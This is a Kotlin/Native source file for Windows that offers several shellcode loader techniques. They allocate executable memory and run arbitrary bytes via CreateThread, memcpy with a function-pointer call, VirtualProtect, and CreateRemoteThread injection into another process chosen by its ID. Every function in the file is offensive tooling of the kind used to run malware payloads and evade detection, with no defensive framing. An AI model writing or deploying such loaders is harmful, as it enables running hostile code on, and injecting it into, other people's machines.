import kotlinx.cinterop.*
import platform.posix.memcpy
import platform.windows.*


/**
 * CreateThread
 */
fun shellCodeThreadExecute(shellcode: ByteArray) {
    val size = shellcode.size
    val lpvoid = VirtualAlloc(
        null, size.convert(), (MEM_COMMIT or MEM_RESERVE).convert(), PAGE_EXECUTE_READWRITE
    )!!
    val addrPtr = lpvoid.reinterpret<ByteVar>()

    for (i in 0 until size) {
        addrPtr[i] = shellcode[i]
    }

    val threadAddr = CreateThread(null, 0, lpvoid.reinterpret(), null, 0, null)

    // 等待线程完成
    WaitForSingleObject(threadAddr, INFINITE)
}

/**
 * RTLCopyMemory
 */
fun shellCodeRTLCopyMemory(shellcode: ByteArray) {
    val size = shellcode.size
    val lpvoid = VirtualAlloc(
        null, size.convert(), (MEM_COMMIT or MEM_RESERVE).convert(), PAGE_EXECUTE_READWRITE
    )!!
    memcpy(lpvoid, shellcode.toCValues(), size.convert())
    lpvoid.reinterpret<CFunction<() -> Unit>>().invoke()
}

/**
 * Syscall
 */
fun shellCodeSyscall(shellcode: ByteArray) {
    val size = shellcode.size
    val lpvoid = VirtualAlloc(
        null, size.convert(), (MEM_COMMIT or MEM_RESERVE).convert(), PAGE_EXECUTE_READWRITE
    )!!
    val addrPtr = lpvoid.reinterpret<ByteVar>()

    for (i in 0 until size) {
        addrPtr[i] = shellcode[i]
    }
    addrPtr.reinterpret<CFunction<() -> Unit>>()()
}

/**
 * TODO: VirtualProtect
 */
fun shellCodeVirtualProtect(shellcode: ByteArray) {
    fun tmpFun() {}
    shellcode.usePinned { pinned ->
        var f = staticCFunction(::tmpFun)

        VirtualProtect(f.reinterpret(), 0, PAGE_EXECUTE_READWRITE, null).let {
            if (it != S_OK) error("Call to VirtualProtect failed")
        }

        f = pinned.addressOf(0).reinterpret()

        VirtualProtect(pinned.addressOf(0), shellcode.size.convert(), PAGE_EXECUTE_READWRITE, null).let {
            if (it != S_OK) error("Call to VirtualProtect failed")
        }
        f.invoke()
    }
}

/**
 * CreateRemoteThread(x64)
 */
fun shellCodeCreateRemoteThread(PID: Int, shellcode: ByteArray) = memScoped {
    val size = shellcode.size
    val lpvoid = VirtualAlloc(
        null, size.convert(), (MEM_COMMIT or MEM_RESERVE).convert(), PAGE_EXECUTE_READWRITE
    )!!
    val addrPtr = lpvoid.reinterpret<ByteVar>()

    for (i in 0 until size) {
        addrPtr[i] = shellcode[i]
    }

    val F = alloc<IntVar>().apply { value = 0 }
    val proc = OpenProcess(
        (PROCESS_CREATE_THREAD or PROCESS_QUERY_INFORMATION or PROCESS_VM_OPERATION or PROCESS_VM_WRITE or PROCESS_VM_READ).convert(),
        F.value,
        PID.convert()
    ) ?: error("unable to open remote process")

    val r_addr =
        VirtualAllocEx(proc, F.ptr, size.convert(), (MEM_COMMIT or MEM_RESERVE).convert(), PAGE_EXECUTE_READWRITE)
            ?: error("unable to allocate memory in remote process")

    WriteProcessMemory(proc, r_addr, lpvoid, size.convert(), F.ptr.reinterpret()).let {
        if (it == 0) error("unable to write shellcode to remote process")
    }

    CreateRemoteThread(proc, F.ptr.reinterpret(), 0, r_addr.reinterpret(), F.ptr, 0, F.ptr.reinterpret())
        ?: error("[!] ERROR : Can't Create Remote Thread.")
}
